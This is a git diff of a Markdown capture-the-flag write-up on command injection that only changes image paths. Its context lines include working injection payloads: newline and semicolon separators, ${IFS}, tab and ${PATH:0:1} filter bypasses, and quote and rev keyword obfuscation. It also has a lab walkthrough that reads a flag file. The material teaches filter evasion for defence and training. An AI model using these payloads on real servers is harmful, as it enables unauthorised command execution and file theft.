@@ -31,7 +31,7 @@ Command injection vulnerabilities are among the most critical ones. This type of
 
 We want to exploit a basic web application that is used to test connectivity to a host. 
 
-![Filtered output](.images/target.png)
+![Filtered output](..images/target.png)
 
 When interacting with the target, by entering an IP address, it returns the result of a `PING` command.
 
@@ -39,7 +39,7 @@ When interacting with the target, by entering an IP address, it returns the resu
 127.0.0.1
 ```
 
-![Filtered output](.images/target2.png)
+![Filtered output](..images/target2.png)
 
 Our input appears to be used as input to the `PING` command. The relevant section of source-code probably looks something like this:
 
@@ -72,11 +72,11 @@ When testing any of the above operators on the target an error message is displa
 Please match the requested format.
 ```
 
-![Filtered output](.images/target3.png)
+![Filtered output](..images/target3.png)
 
 Some applications perform input validation on the front-end and erroneously neglect sanitization on the back-end. An easy way to check if input validation happens on the front-end or not, is to examine the requests being sent by opening the browsers **Network** tab. If no new requests are being made when sending the payload, input validation is done on the front-end. 
 
-![Filtered output](.images/front-end-validation.png)
+![Filtered output](..images/front-end-validation.png)
 
 Front-end validation runs in the user’s browser and provides no real security guarantees. Front-end validation can often be bypassed by sending modified requests directly to the back-end server through a **web proxy**, such as BurpSuite. 
 
@@ -90,7 +90,7 @@ ip=127.0.0.1;whoami
 ip=127.0.0.1%3bwhoami
 ```
 
-![Filtered output](.images/front-end-validation-bypass.png)
+![Filtered output](..images/front-end-validation-bypass.png)
 
 The application returns the original `PING` output, as well as the output from the injected command:
 
@@ -98,7 +98,7 @@ The application returns the original `PING` output, as well as the output from t
 www-data
 ```
 
-![Filtered output](.images/front-end-validation-exploit.png)
+![Filtered output](..images/front-end-validation-exploit.png)
 
 ---
 
@@ -122,7 +122,7 @@ ip=127.0.0.1%3bwhoami
 Invalid input
 ```
 
-![Filtered output](.images/character-filter.png)
+![Filtered output](..images/character-filter.png)
 
 This response differs from the earlier `Please match the requested format` error message, indicating that the payload triggered a security mechanism rather than a simple input validation failure.
 
@@ -138,7 +138,7 @@ Injecting only a semicolon (`;`) is sufficient to trigger the filter, confirming
 ```bash
 ip=127.0.0.1%0a
 ```
-![Filtered output](.images/character-filter-bypass.png)
+![Filtered output](..images/character-filter-bypass.png)
 
 The newline character acts as a command separator in many shell environments, allowing execution to continue on a new line. However, while the injection operator bypass is successful, attempts to execute commands after the newline fail, indicating the presence of additional filtering mechanisms.
 
@@ -148,7 +148,7 @@ Appending a space character after the newline results in another rejection:
 ip=127.0.0.1%0a+
 ```
 
-![Filtered output](.images/character-filter-bypass2.png)
+![Filtered output](..images/character-filter-bypass2.png)
 
 This behavior is expected, as space characters are frequently blacklisted to prevent argument separation. In shell environments, however, whitespace can often be represented in alternative ways.
 
@@ -158,7 +158,7 @@ One common bypass technique is the use of tab characters (`\t`), which are treat
 ip=127.0.0.1%0a%09
 ```
 
-![Filtered output](.images/character-filter-bypass3.png)
+![Filtered output](..images/character-filter-bypass3.png)
 
 We successfully bypassed the space filter by using tabs instead! 
 
@@ -168,7 +168,7 @@ Another effective technique is leveraging the `${IFS}` environment variable. The
 ip=127.0.0.1%0a${IFS}
 ```
 
-![Filtered output](.images/character-filter-bypass4.png)
+![Filtered output](..images/character-filter-bypass4.png)
 
 A third approach involves brace expansion. In Bash, brace expansion occurs before command execution and can be used to construct arguments without explicitly including spaces:
 
@@ -193,7 +193,7 @@ ip=127.0.0.1%0a${IFS}ls${IFS}-la
 ip=127.0.0.1%0a{ls,-la}
 ```
 
-![Filtered output](.images/character-filter-bypass5.png)
+![Filtered output](..images/character-filter-bypass5.png)
 
 This demonstrates how blacklist-based defenses can be systematically bypassed by exploiting shell parsing behavior and alternative representations of filtered characters.
 
@@ -211,7 +211,7 @@ The `PATH` environment variable is a useful starting point, as it typically cont
 echo ${PATH}
 ```
 
-![Filtered output](.images/echo-path.png)
+![Filtered output](..images/echo-path.png)
 
 Bash supports substring expansion, allowing individual characters to be extracted from a variable by specifying an offset and length. By extracting a single character starting at index 0, we obtain the forward slash (`/`):
 
@@ -219,7 +219,7 @@ Bash supports substring expansion, allowing individual characters to be extracte
 echo ${PATH:0:1}
 ```
 
-![Filtered output](.images/echo-path2.png)
+![Filtered output](..images/echo-path2.png)
 
 Similar techniques can be applied to other environment variables such as `HOME`, `PWD`, or `LS_COLORS`, depending on which characters are required.
 
@@ -229,7 +229,7 @@ For example, the `LS_COLORS` variable often contains semicolons. By extracting a
 echo ${LS_COLORS:10:1}
 ```
 
-![Filtered output](.images/echo-ls-colors.png)
+![Filtered output](..images/echo-ls-colors.png)
 
 By dynamically reconstructing blacklisted characters, it becomes possible to build payloads that bypass character-based input filters.
 
@@ -245,7 +245,7 @@ Similarly, the next payload bypasses a blacklist on the forward slash (`/`) by e
 ip=127.0.0.1%0als%09-al%09${PATH:0:1}home
 ```
 
-![Filtered output](.images/echo-path3.png)
+![Filtered output](..images/echo-path3.png)
 
 This demonstrates a fundamental weakness of blacklist-based filtering: even when individual characters are blocked, shell features such as parameter expansion allow attackers to reconstruct those characters at runtime. As long as user input is evaluated by a shell interpreter, seemingly restrictive filters can often be bypassed through indirect character generation.
 
@@ -263,7 +263,7 @@ When attempting to append a command after the newline injection operator, the ap
 ip=127.0.0.1%0awhoami
 ```
 
-![Filtered output](.images/word-filter.png)
+![Filtered output](..images/word-filter.png)
 
 This indicates that the injected command itself (`whoami`) is being detected and blocked by the word filter.
 
@@ -293,7 +293,7 @@ ip=127.0.0.1%0aw'h'o'am'i
 ip=127.0.0.1%0aw"h"o"am"i
 ```
 
-![Filtered output](.images/word-filter2.png)
+![Filtered output](..images/word-filter2.png)
 
 In addition to quotes, other shell features can be leveraged to break up filtered keywords.
 
@@ -316,7 +316,7 @@ ip=127.0.0.1%0aw\h\o\a\mi
 ip=127.0.0.1%0awho$@ami
 ```
 
-![Filtered output](.images/word-filter3.png)
+![Filtered output](..images/word-filter3.png)
 
 Word obfuscation techniques can be combined with previously discussed character bypass methods to construct more complex payloads.
 
@@ -326,7 +326,7 @@ For example, suppose we want to read the contents of `flag.txt` located in `/hom
 ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 ```
 
-![Filtered output](.images/word-filter4.png)
+![Filtered output](..images/word-filter4.png)
 
 Word-based blacklists are highly susceptible to evasion through shell parsing and expansion. As long as user input is evaluated by a shell interpreter, attackers can often transform filtered keywords into semantically equivalent forms that evade exact-match detection.
 
@@ -377,7 +377,7 @@ An injected payload using this approach may look like:
 ip=127.0.0.1%0a$(rev<<<'imaohw')
 ```
 
-![Filtered output](.images/word-filter5.png)
+![Filtered output](..images/word-filter5.png)
 
 A more robust obfuscation strategy involves **encoding** the command and **decoding** it at runtime prior to execution. Common encodings include `base64` and `hex`. 
 
@@ -482,11 +482,11 @@ We are provided with the target address `94.237.54.192:46770` and valid credenti
 
 After authenticating, the application presents itself as a web-based file manager.
 
-![Filtered output](.images/walkthrough1.png)
+![Filtered output](..images/walkthrough1.png)
 
 Once logged in, a list of files is displayed. The interface allows users to perform actions such as **preview**, **copy**, **move**, and **download**.
 
-![Filtered output](.images/walkthrough2.png)
+![Filtered output](..images/walkthrough2.png)
 
 Selecting a random file and choosing the `copy to` action reveals two GET parameters in the request:
 
@@ -494,7 +494,7 @@ Selecting a random file and choosing the `copy to` action reveals two GET parame
 http://94.237.54.192:46770/index.php?to=&from=51459716.txt
 ```
 
-![Filtered output](.images/walkthrough3.png)
+![Filtered output](..images/walkthrough3.png)
 
 The same parameters (`to` and `from`) are observed when selecting the `move to` action. Based on this behavior, it is reasonable to assume that the application executes back-end commands resembling:
 
@@ -509,7 +509,7 @@ Copying a file to the `tmp` directory succeeds, indicating that the functionalit
 http://94.237.54.192:46770/index.php?to=tmp&from=787113764.txt&finish=1
 ```
 
-![Filtered output](.images/walkthrough4.png)
+![Filtered output](..images/walkthrough4.png)
 
 We begin testing for command injection by appending common command separators to the `from` parameter. However, all injected separators are treated as literal input and incorporated into the error message, rather than breaking out of the command context:  
 
@@ -521,7 +521,7 @@ http://94.237.54.192:46770/index.php?to=tmp&from=787113764.txt%26&finish=1
 Error while copying from <file1>& to <file2>&
 ```
 
-![Filtered output](.images/walkthrough5.png)
+![Filtered output](..images/walkthrough5.png)
 
 After testing multiple separators, we conclude that the `copy` functionality is not vulnerable to command injection.
 
@@ -531,7 +531,7 @@ We proceed to test the `move` functionality. Unlike the `copy` operation, attemp
 Malicious request denied!
 ```
 
-![Filtered output](.images/walkthrough6.png)
+![Filtered output](..images/walkthrough6.png)
 
 This behavior strongly suggests the presence of an input filter or WAF protecting the `move` operation.
 
@@ -545,7 +545,7 @@ http://94.237.54.192:46770/index.php?to=tmp&from=605311066.txt%26&finish=1&move=
 http://94.237.54.192:46770/index.php?to=tmp&from=605311066.txt%26%26&finish=1&move=1
 ```
 
-![Filtered output](.images/walkthrough7.png)
+![Filtered output](..images/walkthrough7.png)
 
 This confirms the presence of a command injection vulnerability in the move functionality.
 
@@ -570,4 +570,4 @@ The contents of the `flag` file are returned within the application’s error me
 Error while moving: HTB{c0mm4nd3r_1nj3c70r}
 ```
 
-![Filtered output](.images/flag.png)
+![Filtered output](..images/flag.png)
